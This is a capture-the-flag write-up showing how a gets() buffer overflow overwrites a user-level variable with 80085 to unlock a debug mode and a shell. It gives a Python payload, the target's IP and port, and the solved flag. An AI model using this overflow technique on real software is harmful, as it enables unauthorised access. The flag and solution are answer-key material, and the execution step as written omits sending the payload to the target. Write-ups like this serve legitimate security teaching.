### **Challenge Name: Exploit 200 - Overrun and Outdone**

---

### **Description**

This exploit challenge revolves around exploiting a buffer overflow to gain access to a hidden "debug mode" and execute a shell. The objective is to bypass restrictions and modify the `u.id` variable to access the debug functionality.

#### **Target Details**
- **IP:** `35.184.182.18`
- **Port:** `32001`

#### **Files Provided**
- [Exploit200-1_source.c](Resources/Exploit200-1_source.c)

---

### **Approach**

#### **Step 1: Analyze the Source Code**
The source code (`Exploit200-1_source.c`) revealed:
1. A vulnerable function using `gets()` to handle input.
2. A `u.id` variable that determines the user level:
   - **Guest:** Default value.
   - **Admin (Debug mode):** Triggered when `u.id` equals `80085`.

#### **Step 2: Buffer Overflow**
Calculated the buffer size using:
```bash
python -c "print('A'*28)" | ./Exploit200-1
```
Identified that **28 bytes** fill the buffer, and the next bytes overwrite `u.id`.

#### **Step 3: Payload Construction**
The goal was to overwrite `u.id` with `80085` (0x138BD in hexadecimal). Constructed the payload using Python and `struct.pack` to ensure proper little-endian representation:
```python
import struct

buffer = b"A" * 28
value = struct.pack("<I", 80085)  # Little-endian format
payload = buffer + value

print(payload)
```

#### **Step 4: Execute Payload**
Injected the payload using:
```bash
python payload.py
```

#### **Step 5: Shell Access**
Once `u.id` was successfully overwritten, the debug mode was triggered, granting shell access. Retrieved the flag by navigating the file system:
```bash
ls
cat Exploit200-1_flag.txt
```

---

### **Flag**

`poctf{uwsp_17_w45_7h3_b357_0f_71m35}`

---